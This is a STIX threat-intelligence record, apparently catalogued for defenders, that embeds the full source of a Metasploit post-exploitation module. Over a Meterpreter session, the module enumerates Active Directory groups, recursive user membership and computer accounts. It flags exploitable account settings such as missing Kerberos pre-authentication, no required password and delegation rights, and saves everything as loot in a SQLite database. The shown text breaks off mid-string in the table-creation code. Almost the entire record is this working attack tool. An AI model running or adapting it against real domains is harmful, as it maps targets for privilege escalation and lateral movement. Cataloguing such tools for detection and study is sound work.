{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--97c3dc64-341e-4f62-b4c0-e4716252f7f0",
    "created": "2024-08-14T16:33:05.03824Z",
    "modified": "2024-08-14T16:33:05.038244Z",
    "name": "AD Computer, Group and Recursive User Membership to Local SQLite DB",
    "description": " This module will gather a list of AD groups, identify the users (taking into account recursion) and write this to a SQLite database for offline analysis and query using normal SQL syntax.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/ad_to_sqlite.rb",
            "external_id": "ad_to_sqlite.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'sqlite3'\nrequire 'tempfile'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::LDAP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AD Computer, Group and Recursive User Membership to Local SQLite DB',\n        'Description' => %q{\n          This module will gather a list of AD groups, identify the users (taking into account recursion)\n          and write this to a SQLite database for offline analysis and query using normal SQL syntax.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options([\n      OptString.new('GROUP_FILTER', [false, 'Additional LDAP filters to use when searching for initial groups', '']),\n      OptBool.new('SHOW_USERGROUPS', [true, 'Show the user/group membership in a greppable form to the console.', false]),\n      OptBool.new('SHOW_COMPUTERS', [true, 'Show basic computer information in a greppable form to the console.', false]),\n      OptInt.new('THREADS', [true, 'Number of threads to spawn to gather membership of each group.', 20])\n    ])\n  end\n\n  # Entry point\n  def run\n    max_search = datastore['MAX_SEARCH']\n\n    db, dbfile = create_sqlite_db\n    print_status \"Temporary database created: #{dbfile.path}\"\n\n    # Download the list of groups from Active Directory\n    vprint_status 'Retrieving AD Groups'\n    begin\n      group_fields = ['distinguishedName', 'objectSid', 'samAccountType', 'sAMAccountName', 'whenChanged', 'whenCreated', 'description', 'groupType', 'adminCount', 'comment', 'managedBy', 'cn']\n      if datastore['GROUP_FILTER'].nil? || datastore['GROUP_FILTER'].empty?\n        group_query = '(objectClass=group)'\n      else\n        group_query = \"(&(objectClass=group)(#{datastore['GROUP_FILTER']}))\"\n      end\n      groups = query(group_query, max_search, group_fields)\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Error(Group): #{e.message}\")\n      return\n    end\n\n    # If no groups were downloaded, there's no point carrying on\n    if groups.nil? || groups[:results].empty?\n      print_error('No AD groups were discovered')\n      return\n    end\n\n    # Go through each of the groups and identify the individual users in each group\n    vprint_status \"Groups retrieval completed: #{groups[:results].size} group(s)\"\n    vprint_status 'Retrieving AD Group Membership'\n    users_fields = ['distinguishedName', 'objectSid', 'sAMAccountType', 'sAMAccountName', 'displayName', 'description', 'logonCount', 'userAccountControl', 'userPrincipalName', 'whenChanged', 'whenCreated', 'primaryGroupID', 'badPwdCount', 'comment', 'title', 'cn', 'adminCount', 'manager']\n\n    remaining_groups = groups[:results]\n\n    # If the number of threads exceeds the number of groups, reduce them down to the correct number\n    threadcount = remaining_groups.count < datastore['THREADS'] ? remaining_groups.count : datastore['THREADS']\n\n    # Loop through each of the groups, creating threads where necessary\n    while !remaining_groups.nil? && !remaining_groups.empty?\n      group_gather = []\n      1.upto(threadcount) do\n        group_gather << framework.threads.spawn(\"Module(#{refname})\", false, remaining_groups.shift) do |individual_group|\n          next if !individual_group || individual_group.empty? || individual_group.nil?\n\n          # Get the Group RID\n          group_rid = get_rid(individual_group[1][:value]).to_i\n\n          # Perform the ADSI query to retrieve the effective users in each group (recursion)\n          vprint_status \"Retrieving members of #{individual_group[3][:value]}\"\n          users_filter = \"(&(objectCategory=person)(objectClass=user)(|(memberOf:1.2.840.113556.1.4.1941:=#{individual_group[0][:value]})(primaryGroupID=#{group_rid})))\"\n          users_in_group = query(users_filter, max_search, users_fields)\n\n          grouptype_int = individual_group[7][:value].to_i # Set this here because it is used a lot below\n          sat_int = individual_group[2][:value].to_i\n\n          # Add the group to the database\n          # groupType parameter interpretation: https://msdn.microsoft.com/en-us/library/windows/desktop/ms675935(v=vs.85).aspx\n          # Note that the conversions to UTF-8 are necessary because of the way SQLite detects column type affinity\n          # Turns out that the 'fix' is documented in https://github.com/rails/rails/issues/1965\n          sql_param_group = {\n            g_rid: group_rid,\n            g_distinguishedName: individual_group[0][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n            g_sAMAccountType: sat_int,\n            g_sAMAccountName: individual_group[3][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n            g_whenChanged: individual_group[4][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n            g_whenCreated: individual_group[5][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n            g_description: individual_group[6][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n            g_groupType: grouptype_int,\n            g_adminCount: individual_group[8][:value].to_i,\n            g_comment: individual_group[9][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n            g_managedBy: individual_group[10][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n            g_cn: individual_group[11][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n            # Specifies a group that is created by the system.\n            g_GT_GROUP_CREATED_BY_SYSTEM: (grouptype_int & 0x00000001).zero? ? 0 : 1,\n            # Specifies a group with global scope.\n            g_GT_GROUP_SCOPE_GLOBAL: (grouptype_int & 0x00000002).zero? ? 0 : 1,\n            # Specifies a group with local scope.\n            g_GT_GROUP_SCOPE_LOCAL: (grouptype_int & 0x00000004).zero? ? 0 : 1,\n            # Specifies a group with universal scope.\n            g_GT_GROUP_SCOPE_UNIVERSAL: (grouptype_int & 0x00000008).zero? ? 0 : 1,\n            # Specifies an APP_BASIC group for Windows Server Authorization Manager.\n            g_GT_GROUP_SAM_APP_BASIC: (grouptype_int & 0x00000010).zero? ? 0 : 1,\n            # Specifies an APP_QUERY group for Windows Server Authorization Manager.\n            g_GT_GROUP_SAM_APP_QUERY: (grouptype_int & 0x00000020).zero? ? 0 : 1,\n            # Specifies a security group. If this flag is not set, then the group is a distribution group.\n            g_GT_GROUP_SECURITY: (grouptype_int & 0x80000000).zero? ? 0 : 1,\n            # The inverse of the flag above. Technically GT_GROUP_SECURITY=0 makes it a distribution\n            # group so this is arguably redundant, but I have included it for ease. It makes a lot more sense\n            # to set DISTRIBUTION=1 in a query when your mind is on other things to remember that\n            # DISTRIBUTION is in fact the inverse of SECURITY...:)\n            g_GT_GROUP_DISTRIBUTION: (grouptype_int & 0x80000000).zero? ? 1 : 0,\n            # Now add sAMAccountType constants\n            g_SAM_DOMAIN_OBJECT: (sat_int == 0) ? 1 : 0,\n            g_SAM_GROUP_OBJECT: (sat_int == 0x10000000) ? 1 : 0,\n            g_SAM_NON_SECURITY_GROUP_OBJECT: (sat_int == 0x10000001) ? 1 : 0,\n            g_SAM_ALIAS_OBJECT: (sat_int == 0x20000000) ? 1 : 0,\n            g_SAM_NON_SECURITY_ALIAS_OBJECT: (sat_int == 0x20000001) ? 1 : 0,\n            g_SAM_NORMAL_USER_ACCOUNT: (sat_int == 0x30000000) ? 1 : 0,\n            g_SAM_MACHINE_ACCOUNT: (sat_int == 0x30000001) ? 1 : 0,\n            g_SAM_TRUST_ACCOUNT: (sat_int == 0x30000002) ? 1 : 0,\n            g_SAM_APP_BASIC_GROUP: (sat_int == 0x40000000) ? 1 : 0,\n            g_SAM_APP_QUERY_GROUP: (sat_int == 0x40000001) ? 1 : 0,\n            g_SAM_ACCOUNT_TYPE_MAX: (sat_int == 0x7fffffff) ? 1 : 0\n          }\n          run_sqlite_query(db, 'ad_groups', sql_param_group)\n\n          # Go through each group user\n          next if users_in_group[:results].empty?\n\n          users_in_group[:results].each do |group_user|\n            user_rid = get_rid(group_user[1][:value]).to_i\n            print_line \"Group [#{individual_group[3][:value]}][#{group_rid}] has member [#{group_user[3][:value]}][#{user_rid}]\" if datastore['SHOW_USERGROUPS']\n\n            uac_int = group_user[7][:value].to_i # Set this because it is used so frequently below\n            sat_int = group_user[2][:value].to_i\n\n            # Add the group to the database\n            # Also parse the ADF_ flags from userAccountControl: https://msdn.microsoft.com/en-us/library/windows/desktop/ms680832(v=vs.85).aspx\n            sql_param_user = {\n              u_rid: user_rid,\n              u_distinguishedName: group_user[0][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_sAMAccountType: group_user[2][:value].to_i,\n              u_sAMAccountName: group_user[3][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_displayName: group_user[4][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_description: group_user[5][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_logonCount: group_user[6][:value].to_i,\n              u_userAccountControl: uac_int,\n              u_userPrincipalName: group_user[8][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_whenChanged: group_user[9][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_whenCreated: group_user[10][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_primaryGroupID: group_user[11][:value].to_i,\n              u_badPwdCount: group_user[12][:value].to_i,\n              u_comment: group_user[13][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_title: group_user[14][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              u_cn: group_user[15][:value].to_s.encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              # Indicates that a given object has had its ACLs changed to a more secure value by the\n              # system because it was a member of one of the administrative groups (directly or transitively).\n              u_adminCount: group_user[16][:value].to_i,\n              u_manager: group_user[17][:value].to_s.encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n              # The login script is executed\n              u_ADS_UF_SCRIPT: (uac_int & 0x00000001).zero? ? 0 : 1,\n              # The user account is disabled.\n              u_ADS_UF_ACCOUNTDISABLE: (uac_int & 0x00000002).zero? ? 0 : 1,\n              # The home directory is required.\n              u_ADS_UF_HOMEDIR_REQUIRED: (uac_int & 0x00000008).zero? ? 0 : 1,\n              # The account is currently locked out.\n              u_ADS_UF_LOCKOUT: (uac_int & 0x00000010).zero? ? 0 : 1,\n              # No password is required.\n              u_ADS_UF_PASSWD_NOTREQD: (uac_int & 0x00000020).zero? ? 0 : 1,\n              # The user cannot change the password.\n              u_ADS_UF_PASSWD_CANT_CHANGE: (uac_int & 0x00000040).zero? ? 0 : 1,\n              # The user can send an encrypted password.\n              u_ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED: (uac_int & 0x00000080).zero? ? 0 : 1,\n              # This is an account for users whose primary account is in another domain. This account\n              # provides user access to this domain, but not to any domain that trusts this domain.\n              # Also known as a local user account.\n              u_ADS_UF_TEMP_DUPLICATE_ACCOUNT: (uac_int & 0x00000100).zero? ? 0 : 1,\n              # This is a default account type that represents a typical user.\n              u_ADS_UF_NORMAL_ACCOUNT: (uac_int & 0x00000200).zero? ? 0 : 1,\n              # This is a permit to trust account for a system domain that trusts other domains.\n              u_ADS_UF_INTERDOMAIN_TRUST_ACCOUNT: (uac_int & 0x00000800).zero? ? 0 : 1,\n              # This is a computer account for a computer that is a member of this domain.\n              u_ADS_UF_WORKSTATION_TRUST_ACCOUNT: (uac_int & 0x00001000).zero? ? 0 : 1,\n              # This is a computer account for a system backup domain controller that is a member of this domain.\n              u_ADS_UF_SERVER_TRUST_ACCOUNT: (uac_int & 0x00002000).zero? ? 0 : 1,\n              # The password for this account will never expire.\n              u_ADS_UF_DONT_EXPIRE_PASSWD: (uac_int & 0x00010000).zero? ? 0 : 1,\n              # This is an MNS logon account.\n              u_ADS_UF_MNS_LOGON_ACCOUNT: (uac_int & 0x00020000).zero? ? 0 : 1,\n              # The user must log on using a smart card.\n              u_ADS_UF_SMARTCARD_REQUIRED: (uac_int & 0x00040000).zero? ? 0 : 1,\n              # The service account (user or computer account), under which a service runs, is trusted for Kerberos delegation.\n              # Any such service can impersonate a client requesting the service.\n              u_ADS_UF_TRUSTED_FOR_DELEGATION: (uac_int & 0x00080000).zero? ? 0 : 1,\n              # The security context of the user will not be delegated to a service even if the service\n              # account is set as trusted for Kerberos delegation.\n              u_ADS_UF_NOT_DELEGATED: (uac_int & 0x00100000).zero? ? 0 : 1,\n              # Restrict this principal to use only Data #Encryption Standard (DES) encryption types for keys.\n              u_ADS_UF_USE_DES_KEY_ONLY: (uac_int & 0x00200000).zero? ? 0 : 1,\n              # This account does not require Kerberos pre-authentication for logon.\n              u_ADS_UF_DONT_REQUIRE_PREAUTH: (uac_int & 0x00400000).zero? ? 0 : 1,\n              # The password has expired\n              u_ADS_UF_PASSWORD_EXPIRED: (uac_int & 0x00800000).zero? ? 0 : 1,\n              # The account is enabled for delegation. This is a security-sensitive setting; accounts with\n              # this option enabled should be strictly controlled. This setting enables a service running\n              # under the account to assume a client identity and authenticate as that user to other remote\n              # servers on the network.\n              u_ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION: (uac_int & 0x01000000).zero? ? 0 : 1,\n              # Now add sAMAccountType constants\n              u_SAM_DOMAIN_OBJECT: (sat_int == 0) ? 1 : 0,\n              u_SAM_GROUP_OBJECT: (sat_int == 0x10000000) ? 1 : 0,\n              u_SAM_NON_SECURITY_GROUP_OBJECT: (sat_int == 0x10000001) ? 1 : 0,\n              u_SAM_ALIAS_OBJECT: (sat_int == 0x20000000) ? 1 : 0,\n              u_SAM_NON_SECURITY_ALIAS_OBJECT: (sat_int == 0x20000001) ? 1 : 0,\n              u_SAM_NORMAL_USER_ACCOUNT: (sat_int == 0x30000000) ? 1 : 0,\n              u_SAM_MACHINE_ACCOUNT: (sat_int == 0x30000001) ? 1 : 0,\n              u_SAM_TRUST_ACCOUNT: (sat_int == 0x30000002) ? 1 : 0,\n              u_SAM_APP_BASIC_GROUP: (sat_int == 0x40000000) ? 1 : 0,\n              u_SAM_APP_QUERY_GROUP: (sat_int == 0x40000001) ? 1 : 0,\n              u_SAM_ACCOUNT_TYPE_MAX: (sat_int == 0x7fffffff) ? 1 : 0\n            }\n            run_sqlite_query(db, 'ad_users', sql_param_user)\n\n            # Now associate the user with the group\n            sql_param_mapping = {\n              user_rid: user_rid,\n              group_rid: group_rid\n            }\n            run_sqlite_query(db, 'ad_mapping', sql_param_mapping)\n          end\n        rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n          print_error(\"Error(Users): #{e.message}\")\n          next\n        end\n      end\n      group_gather.map(&:join)\n    end\n\n    vprint_status 'Retrieving computers'\n    begin\n      computer_filter = '(objectClass=computer)'\n      computer_fields = ['distinguishedName', 'objectSid', 'cn', 'dNSHostName', 'sAMAccountType', 'sAMAccountName', 'displayName', 'logonCount', 'userAccountControl', 'whenChanged', 'whenCreated', 'primaryGroupID', 'badPwdCount', 'operatingSystem', 'operatingSystemServicePack', 'operatingSystemVersion', 'description', 'comment']\n      computers = query(computer_filter, max_search, computer_fields)\n\n      computers[:results].each do |comp|\n        computer_rid = get_rid(comp[1][:value]).to_i\n\n        uac_int = comp[8][:value].to_i # Set this because it is used so frequently below\n        sat_int = comp[4][:value].to_i\n\n        # Add the group to the database\n        # Also parse the ADF_ flags from userAccountControl: https://msdn.microsoft.com/en-us/library/windows/desktop/ms680832(v=vs.85).aspx\n        # Note that userAccountControl is basically the same for a computer as a user; this is because a computer account is derived from a user account\n        # (if you look at the objectClass for a computer account, it includes 'user') and, for efficiency, we should really store it all in one\n        # table. However, the reality is that it will get annoying for users to have to remember to use the userAccountControl flags to work out whether\n        # its a user or a computer and so, for convenience and ease of use, I have put them in completely separate tables.\n        # Also add the sAMAccount type flags from https://msdn.microsoft.com/en-us/library/windows/desktop/ms679637(v=vs.85).aspx\n        sql_param_computer = {\n          c_rid: computer_rid,\n          c_distinguishedName: comp[0][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_cn: comp[2][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_dNSHostName: comp[3][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_sAMAccountType: sat_int,\n          c_sAMAccountName: comp[5][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_displayName: comp[6][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_logonCount: comp[7][:value].to_i,\n          c_userAccountControl: uac_int,\n          c_whenChanged: comp[9][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_whenCreated: comp[10][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_primaryGroupID: comp[11][:value].to_i,\n          c_badPwdCount: comp[12][:value].to_i,\n          c_operatingSystem: comp[13][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_operatingSystemServicePack: comp[14][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_operatingSystemVersion: comp[15][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_description: comp[16][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          c_comment: comp[17][:value].encode('UTF-16be', invalid: :replace, undef: :replace, replace: '?').encode('UTF-8', invalid: :replace, undef: :replace, replace: '?'),\n          # The login script is executed\n          c_ADS_UF_SCRIPT: (uac_int & 0x00000001).zero? ? 0 : 1,\n          # The user account is disabled.\n          c_ADS_UF_ACCOUNTDISABLE: (uac_int & 0x00000002).zero? ? 0 : 1,\n          # The home directory is required.\n          c_ADS_UF_HOMEDIR_REQUIRED: (uac_int & 0x00000008).zero? ? 0 : 1,\n          # The account is currently locked out.\n          c_ADS_UF_LOCKOUT: (uac_int & 0x00000010).zero? ? 0 : 1,\n          # No password is required.\n          c_ADS_UF_PASSWD_NOTREQD: (uac_int & 0x00000020).zero? ? 0 : 1,\n          # The user cannot change the password.\n          c_ADS_UF_PASSWD_CANT_CHANGE: (uac_int & 0x00000040).zero? ? 0 : 1,\n          # The user can send an encrypted password.\n          c_ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED: (uac_int & 0x00000080).zero? ? 0 : 1,\n          # This is an account for users whose primary account is in another domain. This account\n          # provides user access to this domain, but not to any domain that trusts this domain.\n          # Also known as a local user account.\n          c_ADS_UF_TEMP_DUPLICATE_ACCOUNT: (uac_int & 0x00000100).zero? ? 0 : 1,\n          # This is a default account type that represents a typical user.\n          c_ADS_UF_NORMAL_ACCOUNT: (uac_int & 0x00000200).zero? ? 0 : 1,\n          # This is a permit to trust account for a system domain that trusts other domains.\n          c_ADS_UF_INTERDOMAIN_TRUST_ACCOUNT: (uac_int & 0x00000800).zero? ? 0 : 1,\n          # This is a computer account for a computer that is a member of this domain.\n          c_ADS_UF_WORKSTATION_TRUST_ACCOUNT: (uac_int & 0x00001000).zero? ? 0 : 1,\n          # This is a computer account for a system backup domain controller that is a member of this domain.\n          c_ADS_UF_SERVER_TRUST_ACCOUNT: (uac_int & 0x00002000).zero? ? 0 : 1,\n          # The password for this account will never expire.\n          c_ADS_UF_DONT_EXPIRE_PASSWD: (uac_int & 0x00010000).zero? ? 0 : 1,\n          # This is an MNS logon account.\n          c_ADS_UF_MNS_LOGON_ACCOUNT: (uac_int & 0x00020000).zero? ? 0 : 1,\n          # The user must log on using a smart card.\n          c_ADS_UF_SMARTCARD_REQUIRED: (uac_int & 0x00040000).zero? ? 0 : 1,\n          # The service account (user or computer account), under which a service runs, is trusted for Kerberos delegation.\n          # Any such service can impersonate a client requesting the service.\n          c_ADS_UF_TRUSTED_FOR_DELEGATION: (uac_int & 0x00080000).zero? ? 0 : 1,\n          # The security context of the user will not be delegated to a service even if the service\n          # account is set as trusted for Kerberos delegation.\n          c_ADS_UF_NOT_DELEGATED: (uac_int & 0x00100000).zero? ? 0 : 1,\n          # Restrict this principal to use only Data #Encryption Standard (DES) encryption types for keys.\n          c_ADS_UF_USE_DES_KEY_ONLY: (uac_int & 0x00200000).zero? ? 0 : 1,\n          # This account does not require Kerberos pre-authentication for logon.\n          c_ADS_UF_DONT_REQUIRE_PREAUTH: (uac_int & 0x00400000).zero? ? 0 : 1,\n          # The password has expired\n          c_ADS_UF_PASSWORD_EXPIRED: (uac_int & 0x00800000).zero? ? 0 : 1,\n          # The account is enabled for delegation. This is a security-sensitive setting; accounts with\n          # this option enabled should be strictly controlled. This setting enables a service running\n          # under the account to assume a client identity and authenticate as that user to other remote\n          # servers on the network.\n          c_ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION: (uac_int & 0x01000000).zero? ? 0 : 1,\n          # Now add the sAMAccountType objects\n          c_SAM_DOMAIN_OBJECT: (sat_int == 0) ? 1 : 0,\n          c_SAM_GROUP_OBJECT: (sat_int == 0x10000000) ? 1 : 0,\n          c_SAM_NON_SECURITY_GROUP_OBJECT: (sat_int == 0x10000001) ? 1 : 0,\n          c_SAM_ALIAS_OBJECT: (sat_int == 0x20000000) ? 1 : 0,\n          c_SAM_NON_SECURITY_ALIAS_OBJECT: (sat_int == 0x20000001) ? 1 : 0,\n          c_SAM_NORMAL_USER_ACCOUNT: (sat_int == 0x30000000) ? 1 : 0,\n          c_SAM_MACHINE_ACCOUNT: (sat_int == 0x30000001) ? 1 : 0,\n          c_SAM_TRUST_ACCOUNT: (sat_int == 0x30000002) ? 1 : 0,\n          c_SAM_APP_BASIC_GROUP: (sat_int == 0x40000000) ? 1 : 0,\n          c_SAM_APP_QUERY_GROUP: (sat_int == 0x40000001) ? 1 : 0,\n          c_SAM_ACCOUNT_TYPE_MAX: (sat_int == 0x7fffffff) ? 1 : 0\n        }\n        run_sqlite_query(db, 'ad_computers', sql_param_computer)\n        print_line \"Computer [#{sql_param_computer[:c_cn]}][#{sql_param_computer[:c_dNSHostName]}][#{sql_param_computer[:c_rid]}]\" if datastore['SHOW_COMPUTERS']\n      end\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Error(Computers): #{e.message}\")\n      return\n    end\n\n    loot_path = store_loot(\n      'host.ad_to_sqlite',\n      'application/x-sqlite3',\n      session,\n      File.binread(dbfile.path),\n      'ad_to_sqlite.db',\n      'AD Computer, Group and Recursive User Membership'\n    )\n\n    print_good(\"Sqlite extraction stored in file: #{loot_path}\")\n  ensure\n    # Finished enumeration, cleanup resources\n    if db\n      db.close\n    end\n\n    if dbfile\n      dbfile.close\n      dbfile.unlink\n    end\n  end\n\n  # Run the parameterised SQL query\n  def run_sqlite_query(db, table_name, values)\n    sql_param_columns = values.keys\n    sql_param_bind_params = values.keys.map { |k| \":#{k}\" }\n    db.execute(\"replace into #{table_name} (#{sql_param_columns.join(',')}) VALUES (#{sql_param_bind_params.join(',')})\", values)\n  end\n\n  # Creat the SQLite Database\n  def create_sqlite_db\n    dbfile = Tempfile.new('ad_to_sqlite')\n    db = SQLite3::Database.new(dbfile.path)\n    db.type_translation = true\n\n    # Create the table for the AD Computers\n    db.execute('DROP TABLE IF EXISTS ad_computers')\n    sql_table_computers = 'CREATE TABLE ad_computers ('\\\n                         'c_rid INTEGER PRIMARY KEY NOT NULL,'\\\n                         'c_distinguishedName TEXT UNIQUE NOT NULL,'\\\n                         'c_cn TEXT,'\\\n                         'c_sAMAccountType INTEGER,'\\\n                         'c_sAMAccountName TEXT UNIQUE NOT NULL,'\\\n                         'c_dNSHostName TEXT,'\\\n                         'c_displayName TEXT,'\\\n                         'c_logonCount INTEGER,'\\\n                         'c_userAccountControl INTEGER,'\\\n                         'c_primaryGroupID INTEGER,'\\\n                         'c_badPwdCount INTEGER,'\\\n                         'c_description TEXT,'\\\n                         'c_comment TEXT,'\\\n                         'c_operatingSystem TEXT,'\\\n                         'c_operatingSystemServicePack TEXT,'\\\n                         'c_operatingSystemVersion TEXT,'\\\n                         'c_whenChanged TEXT,'\\\n                         'c_whenCreated TEXT,'\\\n                         'c_ADS_UF_SCRIPT INTEGER,'\\\n                         'c_ADS_UF_ACCOUNTDISABLE INTEGER,'\\\n                         'c_ADS_UF_HOMEDIR_REQUIRED INTEGER,'\\\n                         'c_ADS_UF_LOCKOUT INTEGER,'\\\n                         'c_ADS_UF_PASSWD_NOTREQD INTEGER,'\\\n                         'c_ADS_UF_PASSWD_CANT_CHANGE INTEGER,'\\\n                         'c_ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED INTEGER,'\\\n                         'c_ADS_UF_TEMP_DUPLICATE_ACCOUNT INTEGER,'\\\n                         'c_ADS_UF_NORMAL_ACCOUNT INTEGER,'\\\n                         'c_ADS_UF_INTERDOMAIN_TRUST_ACCOUNT INTEGER,'\\\n                         'c_ADS_UF_WORKSTATION_TRUST_ACCOUNT INTEGER,'\\\n                         'c_ADS_UF_SERVER_TRUST_ACCOUNT INTEGER,'\\\n                         'c_ADS_UF_DONT_EXPIRE_PASSWD INTEGER,'\\\n                         'c_ADS_UF_MNS_LOGON_ACCOUNT INTEGER,'\\\n                         'c_ADS_UF_SMARTCARD_REQUIRED INTEGER,'\\\n                         'c_ADS_UF_TRUSTED_FOR_DELEGATION INTEGER,'\\\n                         'c_ADS_UF_NOT_DELEGATED INTEGER,'\\\n                         'c_ADS_UF_USE_DES_KEY_ONLY INTEGER,'\\\n                         'c_ADS_UF_DONT_REQUIRE_PREAUTH INTEGER,'\\\n                         'c_ADS_UF_PASSWORD_EXPIRED INTEGER,'\\\n                         'c_ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION INTEGER,'\\\n                         'c_SAM_DOMAIN_OBJECT INTEGER,'\\\n                         'c_SAM_GROUP_OBJECT INTEGER,'\\\n                         'c_SAM_NON_SECURITY_GROUP_OBJECT INTEGER,'\\\n                         'c_SAM_ALIAS_OBJECT INTEGER,'\\\n                         'c_SAM_NON_SECURITY_ALIAS_OBJECT INTEGER,'\\\n                         'c_SAM_NORMAL_USER_ACCOUNT INTEGER,'\\\n                         'c_SAM_MACHINE_ACCOUNT INTEGER,'\\\n                         'c_SAM_TRUST_ACCOUNT INTEGER,'\\\n                         'c_SAM_APP_BASIC_GROUP INTEGER,'\\\n                         'c_SAM_APP_QUERY_GROUP INTEGER,'\\\n                         'c_SAM_ACCOUNT_TYPE_MAX INTEGER)'\n    db.execute(sql_table_computers)\n\n    # Create the table for the AD Groups\n    db.execute('DROP TABLE IF EXISTS ad_groups')\n    sql_table_group = 'CREATE TABLE ad_groups ('\\\n                         'g_rid INTEGER PRIMARY KEY NOT NULL,'\\\n                         'g_distinguishedName TEXT UNIQUE NOT NULL,'\\\n                         'g_sAMAccountType INTEGER,'\\\n                         'g_sAMAccountName TEXT UNIQUE NOT NULL,'\\\n                         'g_groupType INTEGER,'\\\n                         'g_adminCount INTEGER,'\\\n                         'g_description TEXT,'\\\n                         'g_comment TEXT,'\\\n                         'g_cn TEXT,'\\\n                         'g_managedBy TEXT,'\\\n                         'g_whenChanged TEXT,'\\\n                         'g_whenCreated TEXT,'\\\n                         'g_GT_GROUP_CREATED_BY_SYSTEM INTEGER,'\\\n                         'g_GT_GROUP_SCOPE_GLOBAL INTEGER,'\\\n                         'g_GT_GROUP_SCOPE_LOCAL INTEGER,'\\\n                         'g_GT_GROUP_SCOPE_UNIVERSAL INTEGER,'\\\n                         'g_GT_GROUP_SAM_APP_BASIC INTEGER,'\\\n                         'g_GT_GROUP_SAM_APP_QUERY INTEGER,'\\\n                         'g_GT_GROUP_SECURITY INTEGER,'\\\n                         'g_GT_GROUP_DISTRIBUTION INTEGER,'\\\n                         